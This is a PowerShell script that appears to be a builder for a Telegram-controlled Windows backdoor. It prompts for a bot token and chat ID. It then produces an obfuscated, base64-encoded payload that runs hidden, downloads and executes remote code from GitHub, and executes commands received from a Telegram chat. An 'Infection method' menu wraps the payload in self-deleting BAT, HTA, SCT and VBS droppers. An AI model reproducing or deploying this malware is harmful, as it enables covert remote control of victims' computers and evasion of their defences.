clear
$ErrorActionPreference = "SilentlyContinue"
$version = "0.8"

$banner = "    ____  _____ ____      ______     __                              
   / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
  / /_/ /\__ \/ __  / __ \/ / / _ \/ / _ \/ __  / ___/ __  / __  __ \
 / ____/___/ / /_/ / /_/ / / /  __/ /  __/ /_/ / /  / /_/ / / / / / /
/_/    /____/_____/\____/_/  \___/_/\___/\__, /_/   \__,_/_/ /_/ /_/ 
                                        /____/                       "


$show_banner = 'Write-Host $banner -ForegroundColor Green ; Write-Host "`n                                                     v$version by CyberVaca @ HackPlayers" -ForegroundColor red'

IEX $show_banner

do 
{ 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Select Language" -ForegroundColor Green -NoNewline 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "1" -ForegroundColor Red -NoNewline ; Write-Host "] Spanish" -ForegroundColor Green -NoNewline 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "2" -ForegroundColor Red -NoNewline ; Write-Host "] English" -ForegroundColor Green -NoNewline  
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "3" -ForegroundColor Red -NoNewline ; Write-Host "] Exit`n" -ForegroundColor Green -NoNewline     
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Select Option : " -ForegroundColor Green -NoNewline ; $input = Read-Host
     switch ($input) 
     { 
           '1' {
		cls 
        $idioma = "Spanish"
        IEX $show_banner ; sleep 0.1		
        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca el Token del Bot de Telegram: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
		Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca su Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
		Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca el delay para la conexion: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
           } '2' { 
           $idioma = "English"
                cls 
				IEX $show_banner
                Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Enter the Telegram Bot Token: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
				Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Enter your Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
				Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Enter the delay for the connection: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
           } '3' { 
		return
        exit 
           }  
     } 
} 
until ($input -eq 1 -or $input -eq 2 -or $input -eq 3) 

Function check-command
{
 Param ($command)
 $antigua_config = $ErrorActionPreference
 $ErrorActionPreference = 'stop'
 try {if(Get-Command $command){RETURN $true}}
 Catch { RETURN $false}
 Finally {$ErrorActionPreference=$antigua_config}
 }

################################### Comprobamos si existe el cmdlet Ivoke-WebRequest y en el caso de que no exista lo cargamos ######################################

if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃ³n Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}

########################################## Funci�n para encodear en Base64 ##########################################
function code_a_base64 {param ($code)
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]::Compress
$cs = New-Object IO.Compression.DeflateStream ($ms,$action)
$sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
$code | ForEach-Object {$sw.WriteLine($_)}
$sw.Close()
$Compressed = [Convert]::ToBase64String($ms.ToArray())
$command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
"`$(New-Object IO.Compression.DeflateStream (" +
"`$(New-Object IO.MemoryStream (,"+
"`$([Convert]::FromBase64String('$Compressed')))), " +
"[IO.Compression.CompressionMode]::Decompress)),"+
" [Text.Encoding]::ASCII)).ReadToEnd();"
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
return $codeScript
}

############################################################### ScriptBlock del Backdoor ###############################################################
$scriptblock = '
[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay"
IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content 
$chat_id = $bot_Master_ID ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1"
while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
    $l = $json.result.length
	$i = 0
if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
	while ($i -lt $l) {$offset = $json.result[$i].update_id + 1
        $comando = $json.result[$i].message.text
        test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect
   	$i++
	}
	Start-Sleep -s $delay ;$first_connect++}'
$scriptblock = $scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay"
$code = code_a_base64 -code $scriptblock; $code = "powershell.exe -win hidden -enc $code"

######################################################## Tipos de Archivos #######################################################################

$tu_codigo = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu codigo es: `n`n" -ForegroundColor Green -NoNewline  ; sleep 1'
$your_code =  'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Your code is: `n`n" -ForegroundColor Green -NoNewline  ; sleep 1'
$plantilla_hta = "<html><head><script>var c= '$code' 
new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>" 
$plantilla_bat = '@echo off
start /b ' + $code + '
start /b "" cmd /c del "%~f0"&exit /b' 
$plantilla_sct = '<?XML version="1.0"?>
<scriptlet>
<registration
description="Win32COMDebug"
progid="Win32COMDebug"
version="1.00"
classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 >
 <script language="JScript">
      <![CDATA[
           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
      ]]>
 </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>'
$plantilla_vbs = 'Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "' + $code + '"
objShell.Run command,0
Set objShell = Nothing'
$plantilla_macro = "Cooming soon"
############################################################### Funcion Expotar code a archivo ###############################################################



function Exportar-Archivo { param ($plantilla,$tipo)
do 
{ 
  

    Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] � Quieres exportar a un archivo ? (S/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
         switch ($input) 
     { 'S' { 	 $salida = "temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida 
        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] El archivo se exporto : " -ForegroundColor Green -NoNewline ; Write-Host $salida"`n`n" -NoNewline
        } 'N' {return ;exit 	
		
           }   
 	 }
}
until ($input -eq "S" -or $input -eq "N")}

function Exportar-File { param ($plantilla,$tipo)
do 
{ 
  
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Do you want to export the code to a file? (Y/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
         switch ($input) 
     {    'Y' {  $salida = "temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida 
        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] The file is exported: " -ForegroundColor Green -NoNewline ; Write-Host $salida"`n`n" -NoNewline
        } 'N' {return ;exit 	
		
           }  
     } 
} 
until ($input -eq "Y" -or $input -eq "N")}

############################################################### Menu de infeccion Ingles ###############################################################

if ($idioma -eq "English"){
do 
{ 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Infection method`n" -ForegroundColor Green -NoNewline
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "1" -ForegroundColor Red -NoNewline ; Write-Host "] ShellCode" -ForegroundColor Green -NoNewline 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "2" -ForegroundColor Red -NoNewline ; Write-Host "] BAT" -ForegroundColor Green -NoNewline 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "3" -ForegroundColor Red -NoNewline ; Write-Host "] HTA" -ForegroundColor Green -NoNewline 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "4" -ForegroundColor Red -NoNewline ; Write-Host "] SCT" -ForegroundColor Green -NoNewline
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "5" -ForegroundColor Red -NoNewline ; Write-Host "] VBS" -ForegroundColor Green -NoNewline
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "6" -ForegroundColor Red -NoNewline ; Write-Host "] MACRO" -ForegroundColor Green -NoNewline    
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Select Option : " -ForegroundColor Green -NoNewline ; $input = Read-Host
     switch ($input) 
     { 
           '1' { IEX $your_code ; write-host $code
		   } '2' { IEX $your_code ; $plantilla_bat;Write-Host "`n`n" ; Exportar-File -plantilla $plantilla_bat -tipo "bat"
           } '3' { IEX $your_code ; $plantilla_hta;Write-Host "`n`n" ; Exportar-File -plantilla $plantilla_hta -tipo "hta" 
           } '4' { IEX $your_code ; $plantilla_sct;Write-Host "`n`n" ; Exportar-File -plantilla $plantilla_sct -tipo "sct"
           } '5' { IEX $your_code ; $plantilla_vbs;Write-Host "`n`n" ; Exportar-File -plantilla $plantilla_vbs -tipo "vbs"
           } '6' { IEX $your_code ; $plantilla_macro;Write-Host "`n`n" ; pause
		return
        exit 
           }  
     } 
} 
until ($input -eq 1 -or $input -eq 2 -or $input -eq 3 -or $input -eq 4 -or $input -eq 5 -or $input -eq 6) 
}


############################################################### Menu de infeccion Castellano ###############################################################

if ($idioma -eq "Spanish"){
do 
{ 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Metodo de infeccion`n" -ForegroundColor Green -NoNewline
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "1" -ForegroundColor Red -NoNewline ; Write-Host "] ShellCode" -ForegroundColor Green -NoNewline 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "2" -ForegroundColor Red -NoNewline ; Write-Host "] BAT" -ForegroundColor Green -NoNewline 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "3" -ForegroundColor Red -NoNewline ; Write-Host "] HTA" -ForegroundColor Green -NoNewline 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "4" -ForegroundColor Red -NoNewline ; Write-Host "] SCT" -ForegroundColor Green -NoNewline
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "5" -ForegroundColor Red -NoNewline ; Write-Host "] VBS" -ForegroundColor Green -NoNewline
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "6" -ForegroundColor Red -NoNewline ; Write-Host "] MACRO" -ForegroundColor Green -NoNewline    
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Seleccione opcion : " -ForegroundColor Green -NoNewline ; $input = Read-Host
     switch ($input) 
     { 
            '1' { IEX $tu_codigo ; Write-Host $code

           } '2' { IEX $tu_codigo ; $plantilla_bat  ;Write-Host "`n`n" ; Exportar-Archivo -plantilla $plantilla_bat -tipo "bat"
           } '3' { IEX $tu_codigo ; $plantilla_hta ;Write-Host "`n`n" ; Exportar-Archivo -plantilla $plantilla_hta -tipo "hta"
           } '4' { IEX $tu_codigo ; $plantilla_sct ;Write-Host "`n`n" ; Exportar-Archivo -plantilla $plantilla_sct -tipo "sct"
           } '5' { IEX $tu_codigo ; $plantilla_vbs ;Write-Host "`n`n" ; Exportar-Archivo -plantilla $plantilla_vbs -tipo "vbs"
           } '6' { IEX $tu_codigo ; $plantilla_macro ;Write-Host "`n`n" ; 
		return
        exit 
           }  
     } 
} 
until ($input -eq 1 -or $input -eq 2 -or $input -eq 3 -or $input -eq 4 -or $input -eq 5 -or $input -eq 6) 
}

Pause

